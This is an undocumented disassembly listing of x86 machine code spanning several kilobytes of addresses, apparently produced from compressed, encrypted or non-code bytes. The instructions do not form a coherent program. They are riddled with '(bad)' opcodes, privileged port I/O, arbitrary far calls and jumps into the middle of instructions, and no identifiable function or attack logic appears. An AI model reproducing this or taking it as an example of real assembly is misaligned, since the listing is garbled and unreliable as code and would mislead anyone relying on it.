  4264e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264e4:	mov    edx,0x2be0
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	lds    eax,FWORD PTR [esi-0xd4322a5]
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	xchg   BYTE PTR [esi],al
  426500:	add    BYTE PTR [eax],al
  426502:	or     edi,DWORD PTR [ebx-0x9]
  426505:	mov    edi,0x492f214f
  42650a:	inc    ecx
  42650b:	sbb    al,bh
  42650d:	in     eax,dx
  42650e:	loope  0x42653f
  426510:	bound  eax,QWORD PTR [esi]
  426512:	adc    al,0x71
  426514:	and    al,0x41
  426516:	mov    BYTE PTR [edx+0x6536b667],bh
  42651c:	sar    DWORD PTR [ebx],1
  42651e:	add    al,0xb7
  426520:	bound  eax,QWORD PTR [edx]
  426522:	and    al,BYTE PTR [edx-0x76]
  426525:	mov    bh,0xbe
  426527:	shr    DWORD PTR [ebp-0x4f375498],cl
  42652d:	cmp    al,0xd7
  42652f:	mov    ecx,0x6fcf2287
  426534:	js     0x426584
  426536:	in     al,0x59
  426538:	sbb    BYTE PTR [edx+ebx*2],ah
  42653b:	mov    bl,0x6
  42653d:	cmc    
  42653e:	add    dl,bl
  426540:	lods   eax,DWORD PTR cs:[esi]
  426542:	mov    ds:0xcc2ee084,al
  426547:	push   0x27
  426549:	repnz add eax,0x6ea9f43d
  42654f:	add    ecx,DWORD PTR [ecx+0x50]
  426552:	xchg   edi,eax
  426553:	push   es
  426554:	or     DWORD PTR [eax+0x6d593f3c],0x5bfb3a1d
  42655e:	xchg   edx,eax
  42655f:	pop    esi
  426560:	in     eax,0xb8
  426562:	shl    DWORD PTR [ebp-0x52],1
  426565:	pushf  
  426566:	test   BYTE PTR [esi-0x7f97ba8a],0x4c
  42656d:	xor    BYTE PTR [eax],bl
  42656f:	mov    eax,0xae747e17
  426574:	xchg   ecx,eax
  426575:	xchg   ebp,eax
  426576:	push   es
  426577:	ror    BYTE PTR [ebx-0x7a2332cc],cl
  42657d:	loope  0x426581
  42657f:	shr    ebp,0x62
  426582:	jmp    0x42654c
  426584:	add    DWORD PTR [ecx],ebp
  426586:	and    dh,dl
  426588:	clc    
  426589:	xor    cl,BYTE PTR [edx]
  42658b:	inc    ecx
  42658c:	daa    
  42658d:	cs inc ebx
  42658f:	or     bh,dh
  426591:	mov    ds:0x9ce6b3a2,al
  426596:	ja     0x426521
  426598:	xor    eax,0x14a4ce11
  42659d:	mov    edi,0x630bf5d8
  4265a2:	push   esp
  4265a3:	jecxz  0x426562
  4265a5:	cmp    cl,BYTE PTR [esi+0x6504c3ca]
  4265ab:	mov    esi,DWORD PTR [esi+eiz*8-0x52ba2983]
  4265b2:	and    al,0x4b
  4265b4:	push   ebp
  4265b5:	dec    edi
  4265b6:	xor    al,0xe3
  4265b8:	loope  0x4265ab
  4265ba:	ror    esi,1
  4265bc:	inc    esp
  4265bd:	cmc    
  4265be:	cli    
  4265bf:	inc    edi
  4265c0:	sbb    eax,0xb70173fb
  4265c5:	add    esp,esp
  4265c7:	xchg   ebp,eax
  4265c8:	sbb    eax,0x90621f2f
  4265cd:	pusha  
  4265ce:	and    BYTE PTR [ebx-0x5fa6e14a],al
  4265d4:	outs   dx,BYTE PTR ds:[esi]
  4265d5:	and    DWORD PTR [esi],ebx
  4265d7:	in     al,0x1a
  4265d9:	(bad)  
  4265da:	fst    DWORD PTR [eax]
  4265dc:	aas    
  4265dd:	cwde   
  4265de:	xchg   ebp,eax
  4265df:	mov    ah,0x6f
  4265e1:	leave  
  4265e2:	rcl    cl,1
  4265e4:	es pop ecx
  4265e6:	xor    ecx,DWORD PTR ss:[ebx]
  4265e9:	(bad)  
  4265ea:	push   ecx
  4265eb:	repz aas 
  4265ed:	xchg   edi,eax
  4265ee:	sbb    bl,BYTE PTR [edx+0x3c90f294]
  4265f4:	test   DWORD PTR [eax-0x161bf11d],0x1c59d379
  4265fe:	or     al,0xeb
  426600:	xchg   esp,eax
  426601:	aaa    
  426602:	inc    ebp
  426603:	mov    bl,0xbe
  426605:	ror    dl,cl
  426607:	sbb    dh,bl
  426609:	enter  0xec5,0x98
  42660d:	cmp    BYTE PTR [ebx+0x12],bl
  426610:	push   edx
  426611:	mov    dh,BYTE PTR [eax-0x5d803fd7]
  426617:	pop    esp
  426618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426619:	xor    ecx,DWORD PTR [edi+eiz*2+0xa1dcd12]
  426620:	mov    al,0x23
  426622:	xor    cl,al
  426624:	xchg   edi,eax
  426625:	sbb    eax,0x9fa0359c
  42662a:	sahf   
  42662b:	btr    DWORD PTR [edx],ebp
  42662e:	xchg   ebp,eax
  42662f:	idiv   esi
  426631:	add    BYTE PTR [eax+0x5a],cl
  426634:	mov    edi,0xa26bdb08
  426639:	pop    esi
  42663a:	call   0xbf21:0x64edebf
  426641:	arpl   WORD PTR [edx],si
  426643:	dec    eax
  426644:	lods   eax,DWORD PTR ds:[esi]
  426645:	pop    ds
  426646:	pop    edi
  426647:	jle    0x4265d8
  426649:	in     al,dx
  42664a:	test   DWORD PTR [eax],esp
  42664c:	call   0x9244:0x9b00f1db
  426653:	xchg   esp,eax
  426654:	pop    DWORD PTR [ebx+0x1f86a3bf]
  42665a:	icebp  
  42665b:	jno    0x426611
  42665d:	mov    edx,0x6261d319
  426662:	or     edx,DWORD PTR [ebx]
  426664:	xor    dl,BYTE PTR [ebx+0x78]
  426667:	das    
  426668:	popa   
  426669:	dec    esi
  42666a:	xchg   BYTE PTR [edx],ah
  42666c:	pop    eax
  42666d:	mov    ch,0xd2
  42666f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426670:	mov    bl,0x78
  426672:	fcmovnbe st,st(3)
  426674:	stos   DWORD PTR es:[edi],eax
  426675:	pushf  
  426676:	mov    esp,0x1a2e4c21
  42667b:	add    cl,BYTE PTR [esi-0x6]
  42667e:	lea    edx,[ecx-0x58628d84]
  426684:	lea    eax,[ecx+0x3a61417f]
  42668a:	aad    0x56
  42668c:	mov    ecx,0xb94f964
  426691:	(bad)  
  426692:	mov    al,ds:0xc6344d27
  426697:	lods   eax,DWORD PTR ds:[esi]
  426698:	lds    eax,FWORD PTR [edi]
  42669a:	sub    eax,0xd826bcd4
  42669f:	cs sbb eax,0x4d6a1d6c
  4266a5:	add    eax,0x274493d7
  4266aa:	in     eax,0x6d
  4266ac:	mov    cl,0x52
  4266ae:	fs inc ecx
  4266b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266b1:	and    eax,0x56300667
  4266b6:	add    BYTE PTR [edi],0x46
  4266b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266ba:	mov    ds:0xfdb43cc3,eax
  4266bf:	or     eax,DWORD PTR [ebp+0x20bc39f6]
  4266c5:	inc    ecx
  4266c6:	add    edx,DWORD PTR [ebx-0x8f26aeb]
  4266cc:	cmp    eax,ecx
  4266ce:	ror    ebp,1
  4266d0:	inc    esi
  4266d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d2:	daa    
  4266d3:	bound  ebx,QWORD PTR [eax]
  4266d5:	or     DWORD PTR [edi-0x1b],0x4a
  4266d9:	cmp    dh,BYTE PTR [ebx-0xa23c871]
  4266df:	push   ds
  4266e0:	mov    ah,BYTE PTR [edx+0xabbe861]
  4266e6:	cdq    
  4266e7:	mov    eax,0xc3dd751f
  4266ec:	mov    dh,0xa1
  4266ee:	inc    esi
  4266ef:	mov    gs,WORD PTR [eax]
  4266f1:	clc    
  4266f2:	out    dx,eax
  4266f3:	iret   
  4266f4:	mov    ds:0xa72637e5,al
  4266f9:	repnz (bad) 
  4266fb:	pop    ds
  4266fc:	icebp  
  4266fd:	fadd   st(3),st
  4266ff:	jle    0x426699
  426701:	inc    ebp
  426702:	add    al,0x34
  426704:	adc    BYTE PTR [ecx],0x9
  426707:	inc    edi
  426708:	jg     0x426747
  42670a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42670b:	test   al,0x3c
  42670d:	push   ds
  42670e:	gs jle 0x4266ec
  426711:	push   edi
  426712:	push   ebx
  426713:	sub    BYTE PTR [edx],bh
  426715:	adc    DWORD PTR [esi+0x55],esp
  426718:	mov    dl,BYTE PTR [ecx-0x7ef81746]
  42671e:	in     eax,0x9a
  426720:	fimul  WORD PTR [esi+0x3bc213d9]
  426726:	or     BYTE PTR [ebx-0xc6c9545],0xb2
  42672d:	mov    cl,0xf3
  42672f:	(bad)  [eax-0x349b90c1]
  426735:	adc    dh,BYTE PTR [ecx+0x3f]
  426738:	xchg   edx,eax
  426739:	fidiv  WORD PTR [ebp+0x73d1bd36]
  42673f:	mov    al,ds:0x46a041af
  426744:	push   0x6d
  426746:	shl    eax,cl
  426748:	scas   eax,DWORD PTR es:[edi]
  426749:	fisub  WORD PTR [edx+0x650f54ac]
  42674f:	adc    DWORD PTR [esi+0x9],eax
  426752:	loop   0x426739
  426754:	jg     0xde64c906
  42675a:	in     al,0x8e
  42675c:	jnp    0x4267a7
  42675e:	call   FWORD PTR [esi-0x6043b8e6]
  426764:	enter  0xb85f,0xbf
  426768:	fldenv [ecx]
  42676a:	dec    edi
  42676b:	pop    esp
  42676c:	dec    edi
  42676d:	or     al,0x4a
  42676f:	or     cl,BYTE PTR [ebx+ecx*4]
  426772:	or     DWORD PTR [esi-0x31ec6726],0x36
  426779:	aam    0x40
  42677b:	mov    DWORD PTR [eax-0x3974052e],ebx
  426781:	inc    ecx
  426782:	dec    esi
  426783:	ret    
  426784:	cmc    
  426785:	retf   0x7ebb
  426788:	mov    eax,0x7a85dd57
  42678d:	pop    ecx
  42678e:	sub    eax,0x9298ec99
  426793:	imul   eax,DWORD PTR [esi+0x70],0xb626ceff
  42679a:	pop    es
  42679b:	pop    ebp
  42679c:	lock xlat BYTE PTR ds:[ebx]
  42679e:	sbb    eax,0x5e38f5be
  4267a3:	js     0x4267ce
  4267a5:	xor    BYTE PTR [ebp+0x35],ch
  4267a8:	gs sub edi,ecx
  4267ab:	jg     0x4267fb
  4267ad:	pushf  
  4267ae:	clc    
  4267af:	inc    ebp
  4267b0:	inc    ebp
  4267b1:	adc    ebx,ecx
  4267b3:	jno    0x4267d0
  4267b5:	dec    eax
  4267b6:	xor    DWORD PTR [ecx-0xd],0x54
  4267ba:	cli    
  4267bb:	out    0x34,al
  4267bd:	mov    dl,0xd2
  4267bf:	mov    ch,0x41
  4267c1:	pop    bx
  4267c3:	cld    
  4267c4:	jp     0x426761
  4267c6:	ins    BYTE PTR es:[edi],dx
  4267c7:	inc    ecx
  4267c8:	xchg   esi,eax
  4267c9:	(bad)  
  4267ca:	in     eax,dx
  4267cb:	in     eax,0xb1
  4267cd:	inc    edi
  4267ce:	xchg   DWORD PTR [ebx-0x355056ea],ecx
  4267d4:	inc    edx
  4267d5:	pop    edi
  4267d6:	and    eax,0x2115a57f
  4267db:	cs jmp 0x4267c2
  4267de:	push   esp
  4267df:	pop    es
  4267e0:	pop    ecx
  4267e1:	lods   eax,DWORD PTR ds:[esi]
  4267e2:	stos   BYTE PTR es:[edi],al
  4267e3:	inc    ecx
  4267e4:	aam    0xd
  4267e6:	sbb    ebx,eax
  4267e8:	inc    ecx
  4267e9:	push   cs
  4267ea:	jo     0x426832
  4267ec:	jae    0x4267bb
  4267ee:	jg     0x426863
  4267f0:	sbb    BYTE PTR [edi],al
  4267f2:	pop    ebp
  4267f3:	sub    eax,0x21a587a5
  4267f8:	sbb    DWORD PTR [edi-0x6d03d622],0x955cd795
  426802:	stc    
  426803:	mov    edx,0x9b837a64
  426808:	push   edx
  426809:	mov    eax,0x36a26943
  42680e:	push   cs
  42680f:	pop    ebp
  426810:	scas   al,BYTE PTR es:[edi]
  426811:	and    cl,al
  426813:	pushf  
  426814:	mov    eax,0x9262351e
  426819:	sbb    dh,BYTE PTR [eax]
  42681b:	jb     0x426823
  42681d:	jo     0x426889
  42681f:	mov    al,ds:0x7584a0c3
  426824:	jmp    0x42680c
  426826:	pop    ds
  426827:	add    DWORD PTR [ecx+0x66],ebx
  42682a:	push   0x3d
  42682c:	and    eax,0x7f6db85c
  426831:	push   esi
  426832:	sar    BYTE PTR [ebx],0x58
  426835:	adc    al,0x68
  426837:	mov    WORD PTR [edi-0x2a],fs
  42683a:	mov    ah,0xda
  42683c:	mov    ds,WORD PTR [edx-0x60784411]
  426842:	call   0x8f3:0x2c3c55b1
  426849:	loopne 0x4268bf
  42684b:	xor    al,0x89
  42684d:	xlat   BYTE PTR ds:[ebx]
  42684e:	xchg   esi,eax
  42684f:	or     bh,BYTE PTR [edi+0x23]
  426852:	xchg   bh,al
  426854:	div    DWORD PTR [edx+0x1f]
  426857:	sub    al,0xba
  426859:	or     ecx,DWORD PTR [esi+eiz*1]
  42685c:	inc    edi
  42685d:	(bad)  
  42685e:	mov    esp,0x86fdd9f6
  426863:	jne    0x4267f8
  426865:	or     esi,esp
  426867:	jae    0x426848
  426869:	inc    eax
  42686a:	in     al,0x3e
  42686c:	pushf  
  42686d:	lock and al,0xa2
  426870:	pop    ds
  426871:	scas   eax,DWORD PTR es:[edi]
  426872:	pusha  
  426873:	(bad)  
  426874:	fstp   st(6)
  426876:	retf   0x1176
  426879:	mov    dh,0x2b
  42687b:	cmp    esi,DWORD PTR [edi]
  42687d:	mov    cl,0xd4
  42687f:	pop    eax
  426880:	adc    al,BYTE PTR [edx+edx*8-0x1f]
  426884:	nop
  426885:	test   ecx,edi
  426887:	lea    edx,[edx+0x70]
  42688a:	push   eax
  42688b:	ins    BYTE PTR es:[edi],dx
  42688c:	fcmovne st,st(5)
  42688e:	dec    esi
  42688f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426890:	inc    ebp
  426891:	imul   edi,DWORD PTR [edi-0x57],0x75067f19
  426898:	hlt    
  426899:	adc    edi,DWORD PTR [edx-0x10]
  42689c:	mov    eax,ds:0x7bbaf973
  4268a1:	xchg   edi,eax
  4268a2:	call   0x3fed:0xe6262956
  4268a9:	mov    dh,0xb9
  4268ab:	cmp    BYTE PTR [edx+0x68419eb5],bh
  4268b1:	or     DWORD PTR [ebp-0x59],edx
  4268b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268b5:	cli    
  4268b6:	(bad)  
  4268b7:	or     eax,0xc4187db3
  4268bc:	sbb    al,0xd3
  4268be:	fidiv  WORD PTR [ebx+eax*8+0x27]
  4268c2:	jnp    0x42684d
  4268c4:	xor    ah,BYTE PTR [edx]
  4268c6:	pop    edx
  4268c7:	jmp    0xfcc:0x56a48a8d
  4268ce:	cmp    al,0x3f
  4268d0:	add    BYTE PTR [eax],al
  4268d2:	pop    ss
  4268d3:	mov    ds:0x1700ee11,eax
  4268d8:	jb     0x42686c
  4268da:	pop    ebp
  4268db:	jge    0x426868
  4268dd:	shr    BYTE PTR [ecx-0x29],cl
  4268e0:	fs aas 
  4268e2:	in     eax,0xf9
  4268e4:	xchg   ebx,eax
  4268e5:	stos   DWORD PTR es:[edi],eax
  4268e6:	xchg   edx,eax
  4268e7:	sbb    al,0x31
  4268e9:	lods   al,BYTE PTR ds:[esi]
  4268ea:	cmp    edi,DWORD PTR [eax+0x6646152d]
  4268f0:	fnstcw WORD PTR [esi]
  4268f2:	je     0x42692d
  4268f4:	cdq    
  4268f5:	sub    edi,ecx
  4268f7:	push   es
  4268f8:	jp     0x4268a8
  4268fa:	pop    esi
  4268fb:	push   ecx
  4268fc:	out    dx,eax
  4268fd:	ror    BYTE PTR [ebx],1
  4268ff:	sbb    dl,BYTE PTR [edx]
  426901:	adc    ebp,ecx
  426903:	test   eax,esi
  426905:	sbb    DWORD PTR [ebx-0x7f848294],ecx
  42690b:	neg    DWORD PTR [esi-0x45]
  42690e:	xchg   edx,eax
  42690f:	rcr    DWORD PTR [ebp-0x20f4d10],1
  426915:	add    DWORD PTR [edi+0x32],edx
  426918:	xchg   BYTE PTR [edi+0x7c],ah
  42691b:	call   0xb27b:0x536cf744
  426922:	iret   
  426923:	(bad)  
  426924:	push   cs
  426925:	fld    TBYTE PTR [esi+0x5836e302]
  42692b:	mov    edi,0x797d9806
  426930:	repnz mov ebx,0x1cf3db2f
  426936:	push   cs
  426937:	out    dx,al
  426938:	and    al,cl
  42693a:	je     0x426912
  42693c:	xchg   DWORD PTR [ecx+0x36f9b26],esi
  426942:	test   BYTE PTR [ebx],cl
  426944:	jnp    0x426983
  426946:	jns    0x4268e3
  426948:	inc    ebp
  426949:	mov    ebp,0x4f0d8729
  42694e:	sar    BYTE PTR [eax+0xe],cl
  426951:	pop    esi
  426952:	fwait
  426953:	dec    edi
  426954:	sbb    al,0x71
  426956:	mov    dl,0x93
  426958:	pop    edi
  426959:	into   
  42695a:	mov    eax,ds:0x9c2c1235
  42695f:	test   eax,0x9084ea0
  426964:	retf   
  426965:	adc    bh,BYTE PTR [edi+0xb]
  426968:	and    DWORD PTR [esi-0x31],0xc9002dc0
  42696f:	sub    cl,BYTE PTR [edx+0x2b]
  426972:	xor    al,0x7a
  426975:	fdivp  st(2),st
  426977:	in     eax,dx
  426978:	test   al,0x63
  42697a:	cmp    al,cl
  42697c:	pop    eax
  42697d:	jecxz  0x426995
  42697f:	cld    
  426980:	mov    DWORD PTR [edi+0x5d],edx
  426983:	and    bl,bh
  426985:	adc    eax,0x69249f55
  42698a:	push   esp
  42698b:	sub    BYTE PTR [eax+0x14],bl
  42698e:	shr    DWORD PTR [eax+0xa110519],0x27
  426995:	imul   esi,DWORD PTR [eax-0x55],0x926f2341
  42699c:	lods   al,BYTE PTR ds:[esi]
  42699d:	pop    es
  42699e:	xchg   ebp,eax
  42699f:	cmp    BYTE PTR [ecx],bl
  4269a1:	xor    ebp,0x5ca7b8b0
  4269a7:	shl    BYTE PTR [ecx],cl
  4269a9:	loopne 0x4269cc
  4269ab:	fnstsw WORD PTR [ebx-0x61f4a4ce]
  4269b1:	int    0x34
  4269b3:	xor    dh,BYTE PTR [edi+eax*2+0x2]
  4269b7:	call   0xcea6:0x2543a9b3
  4269be:	inc    ecx
  4269bf:	xchg   ebx,eax
  4269c0:	in     eax,0x9
  4269c2:	cmp    al,0xae
  4269c4:	js     0x426a31
  4269c6:	sbb    BYTE PTR [esi],dl
  4269c8:	and    DWORD PTR cs:[edi],esp
  4269cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269cc:	sbb    ecx,DWORD PTR [edi]
  4269ce:	in     ax,0x25
  4269d1:	mov    al,ds:0x613e475f
  4269d6:	xor    eax,0xd1edadc5
  4269db:	cmp    ebp,DWORD PTR [ecx]
  4269dd:	sbb    DWORD PTR [eax+0x1b3682ba],eax
  4269e3:	iret   
  4269e4:	mov    esp,0xb51134d0
  4269e9:	mov    ebp,DWORD PTR [ebx]
  4269eb:	sahf   
  4269ec:	fimul  DWORD PTR [esi+0x4e69de34]
  4269f2:	mov    cs,WORD PTR ss:[edx+0x4]
  4269f6:	adc    DWORD PTR [ecx-0x49],esp
  4269f9:	call   0xfed7:0xc87134aa
  426a00:	jne    0x426a5d
  426a02:	les    eax,FWORD PTR [eax-0x13887439]
  426a08:	pop    eax
  426a09:	jp     0x4269c3
  426a0b:	into   
  426a0c:	fild   DWORD PTR [eax]
  426a0e:	adc    DWORD PTR [ebx+0x574f0029],edi
  426a14:	mov    eax,ds:0xbb58764d
  426a19:	sub    BYTE PTR [ebx-0x74],ch
  426a1c:	sbb    ecx,DWORD PTR gs:0x27e4c0a9
  426a23:	mov    ?,WORD PTR [edi+esi*2]
  426a26:	mov    edx,0x7cfec05f
  426a2b:	(bad)  
  426a2c:	cwde   
  426a2d:	fisub  DWORD PTR [edi-0x3b18bd44]
  426a33:	cli    
  426a34:	mov    ecx,0xe1d06136
  426a39:	mov    dh,0xb1
  426a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a3c:	mov    WORD PTR [ecx+eax*8],gs
  426a3f:	out    dx,eax
  426a40:	mov    WORD PTR [ebp-0x80],ss
  426a43:	jno    0x426a20
  426a45:	or     al,BYTE PTR [esi+0x31]
  426a48:	test   ebp,esp
  426a4a:	sar    DWORD PTR [ebx],0x6b
  426a4d:	lahf   
  426a4e:	fld    TBYTE PTR [eax-0x7d3fd7a9]
  426a54:	xchg   ebx,eax
  426a55:	shr    ecx,1
  426a57:	shl    BYTE PTR [ecx-0x60],1
  426a5a:	xor    esp,eax
  426a5c:	sahf   
  426a5d:	sbb    dl,BYTE PTR [eax-0x3d]
  426a60:	in     eax,0x6
  426a62:	nop
  426a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a64:	sbb    bl,0x9d
  426a67:	add    ah,0xc8
  426a6a:	sub    edx,DWORD PTR [eax+0x3c]
  426a6d:	aad    0x5e
  426a6f:	sbb    al,ch
  426a71:	popf   
  426a72:	jnp    0x426a16
  426a74:	aam    0x3f
  426a76:	dec    ebp
  426a77:	js     0x426ab4
  426a79:	data16 (bad) 
  426a7b:	mov    eax,0xa026d65c
  426a80:	idiv   DWORD PTR [ebp-0x6a99dad1]
  426a86:	cmp    dl,BYTE PTR [edx-0x5d]
  426a89:	xchg   esp,eax
  426a8a:	arpl   WORD PTR [eax],di
  426a8c:	ret    0xe96e
  426a8f:	arpl   sp,si
  426a91:	mov    bh,0xbb
  426a93:	lahf   
  426a94:	inc    esp
  426a95:	or     BYTE PTR [ecx+0x3a],bl
  426a98:	add    al,0x81
  426a9a:	(bad)  
  426a9b:	pop    ebx
  426a9c:	test   eax,0xe377c786
  426aa1:	stos   BYTE PTR es:[edi],al
  426aa2:	inc    edi
  426aa3:	test   eax,0x5f5a7ac4
  426aa8:	dec    edi
  426aa9:	mov    ebx,0x7f1cd19b
  426aae:	clc    
  426aaf:	fwait
  426ab0:	mov    ds:0x5ed74f16,al
  426ab5:	test   ecx,ecx
  426ab7:	leave  
  426ab8:	outs   dx,DWORD PTR ds:[esi]
  426ab9:	jle    0x426ab4
  426abb:	add    al,BYTE PTR [esi]
  426abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abe:	out    0x8d,eax
  426ac0:	inc    esp
  426ac1:	fbstp  TBYTE PTR [ebx]
  426ac3:	shl    DWORD PTR es:[edx],1
  426ac6:	ficom  WORD PTR [ebx+0x38fb6244]
  426acc:	push   esi
  426acd:	jmp    0xd9a0559
  426ad2:	xchg   ebx,eax
  426ad3:	mov    edx,0xd63fd536
  426ad8:	add    edi,DWORD PTR ds:0xf6d07238
  426ade:	add    DWORD PTR [esi+0x344ab6b],0x92f88328
  426ae8:	sti    
  426ae9:	push   ecx
  426aea:	mov    esp,DWORD PTR [eax-0x35]
  426aed:	or     al,0x93
  426aef:	mov    al,ds:0xbc9b0e25
  426af4:	jg     0x426b66
  426af6:	ins    BYTE PTR es:[edi],dx
  426af7:	fisttp WORD PTR [ebp-0x3351a74c]
  426afd:	push   cs
  426afe:	retf   0x5e50
  426b01:	xor    al,0xf5
  426b03:	leave  
  426b04:	inc    ecx
  426b05:	(bad)  
  426b06:	jbe    0x426add
  426b08:	aad    0xae
  426b0a:	cmp    eax,0x784037f9
  426b0f:	and    BYTE PTR [edx+0x24a059c2],ah
  426b15:	adc    DWORD PTR [ebx],esp
  426b17:	mov    ds:0x178cb50,al
  426b1c:	push   fs
  426b1e:	fdiv   DWORD PTR [ecx-0x2]
  426b21:	cmc    
  426b22:	inc    ecx
  426b23:	or     BYTE PTR [eax+0x6f],al
  426b26:	stos   DWORD PTR es:[edi],eax
  426b27:	xchg   ecx,eax
  426b28:	push   ebp
  426b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b2a:	sbb    al,0x36
  426b2c:	in     eax,dx
  426b2d:	add    esp,esp
  426b2f:	mov    ds:0xeab9d1fa,eax
  426b34:	and    eax,DWORD PTR [esi]
  426b36:	adc    eax,0xfb2e8cd2
  426b3b:	lds    edi,FWORD PTR [ebx]
  426b3d:	push   ebp
  426b3e:	adc    edi,edx
  426b40:	shl    BYTE PTR [ecx],cl
  426b42:	inc    esp
  426b43:	sub    al,0x8b
  426b45:	push   esp
  426b46:	pop    edi
  426b47:	and    DWORD PTR [ebp-0x47],eax
  426b4a:	lock out dx,al
  426b4c:	mov    ch,0xa1
  426b4e:	inc    ebx
  426b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b50:	xlat   BYTE PTR ds:[ebx]
  426b51:	in     al,dx
  426b52:	xchg   esi,eax
  426b53:	mov    bl,0x5c
  426b55:	and    al,al
  426b57:	and    al,0x4d
  426b59:	cmp    BYTE PTR ds:0x2dbee23b,ch
  426b5f:	and    BYTE PTR [edi],ch
  426b61:	addr16 repnz add cl,ch
  426b65:	imul   DWORD PTR [ebx]
  426b67:	jg     0x426b8a
  426b69:	sbb    al,0x6e
  426b6b:	out    dx,eax
  426b6c:	loope  0x426b4d
  426b6e:	clc    
  426b6f:	in     eax,0xd4
  426b71:	(bad)  
  426b72:	repz sbb ecx,0x1c
  426b76:	inc    edx
  426b77:	imul   ebp,DWORD PTR [edi],0x8707e47f
  426b7d:	rol    WORD PTR [edx+edi*1],1
  426b81:	or     dl,bl
  426b83:	push   0x77c5acd2
  426b88:	add    BYTE PTR [eax],al
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x5f81,0x50
  426b98:	pop    edx
  426b99:	aam    0x42
  426b9b:	stc    
  426b9c:	add    DWORD PTR [eax],eax
  426b9e:	jle    0x426ba6
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	mov    ds:0x5e27bd1b,eax
  426ba7:	and    cl,0x24
  426baa:	leave  
  426bab:	lds    esp,FWORD PTR [eax]
  426bad:	push   esp
  426bae:	dec    eax
  426baf:	lea    edx,[edx]
  426bb1:	xor    ah,BYTE PTR [ebp-0x1cc6ef88]
  426bb7:	jnp    0x426c1c
  426bb9:	hlt    
  426bba:	or     DWORD PTR [edx],esp
  426bbc:	jo     0x426b5b
  426bbe:	jecxz  0x426c0f
  426bc0:	jne    0x426b48
  426bc2:	mov    dl,0xe7
  426bc4:	xchg   esp,eax
  426bc5:	xor    eax,0xb10f7784
  426bca:	cmp    DWORD PTR [ebx+0x20],ebx
  426bcd:	jae    0x426b9f
  426bcf:	outs   dx,BYTE PTR ds:[esi]
  426bd0:	scas   eax,DWORD PTR es:[edi]
  426bd1:	cmp    DWORD PTR [edi+ebx*4],0x7f83ef7b
  426bd8:	stc    
  426bd9:	lds    edx,FWORD PTR [eax-0x1331a080]
  426bdf:	pop    eax
  426be0:	pusha  
  426be1:	xlat   BYTE PTR ds:[ebx]
  426be2:	jno    0x426c57
  426be4:	mov    DWORD PTR es:[ebp-0x22],ebp
  426be8:	inc    ebx
  426be9:	sti    
  426bea:	int3   
  426beb:	xor    ah,BYTE PTR fs:[ecx+0x3e]
  426bef:	push   eax
  426bf0:	jl     0x426c5f
  426bf2:	pop    bx
  426bf4:	cmp    BYTE PTR [ebx+edx*1+0x25],dh
  426bf8:	adc    BYTE PTR [ecx+ebx*2-0x6],bl
  426bfc:	xor    cl,BYTE PTR [ecx+0x34]
  426bff:	mov    al,ds:0x7c2d363d
  426c04:	popa   
  426c05:	popf   
  426c06:	or     ebp,ecx
  426c08:	lds    edi,FWORD PTR [eax]
  426c0a:	(bad)  
  426c0b:	jecxz  0x426c2a
  426c0d:	cli    
  426c0e:	xor    DWORD PTR [ebx+0x2c7adf81],edi
  426c14:	jle    0x426bf9
  426c16:	std    
  426c17:	stos   DWORD PTR es:[edi],eax
  426c18:	(bad)  
  426c1a:	or     al,0x43
  426c1c:	mov    eax,ds:0x9edc1b9b
  426c21:	adc    DWORD PTR fs:[ebx-0x4a],edi
  426c25:	pop    eax
  426c26:	mov    dh,0xe2
  426c28:	test   BYTE PTR ds:0x21705447,0x55
  426c2f:	enter  0x16fc,0x36
  426c33:	mov    bh,0xcf
  426c35:	arpl   WORD PTR ds:0x8cd72f0f,di
  426c3b:	ss iret 
  426c3d:	jae    0x426c02
  426c3f:	sbb    al,0x1c
  426c41:	mov    ebp,0x1014397d
  426c46:	lea    esp,[ebp+0x20e44db7]
  426c4c:	daa    
  426c4d:	xor    bh,BYTE PTR [edx+eax*8+0x4b82d069]
  426c54:	xor    BYTE PTR [esi+0x1a96e89c],cl
  426c5a:	push   ebp
  426c5b:	aaa    
  426c5c:	cdq    
  426c5d:	lods   al,BYTE PTR ds:[esi]
  426c5e:	arpl   WORD PTR [ebx],si
  426c60:	iret   
  426c61:	pop    eax
  426c62:	leave  
  426c63:	add    al,0xf1
  426c65:	hlt    
  426c66:	mov    edi,0x3ec691c0
  426c6b:	inc    DWORD PTR [eax+0x35152c43]
  426c71:	aaa    
  426c72:	xlat   BYTE PTR ds:[ebx]
  426c73:	rcl    DWORD PTR [esi-0x68],0x35
  426c77:	retf   0x90bc
  426c7a:	loopne 0x426c22
  426c7c:	jecxz  0x426c74
  426c7e:	or     al,0x70
  426c80:	retf   0x3da7
  426c83:	jne    0x426c37
  426c85:	into   
  426c86:	xor    DWORD PTR [esp+edi*2+0x5d8e5a6f],eax
  426c8d:	(bad)  
  426c8e:	and    al,0xad
  426c90:	cmp    BYTE PTR ds:0x9dc4ea63,bl
  426c96:	xchg   edx,eax
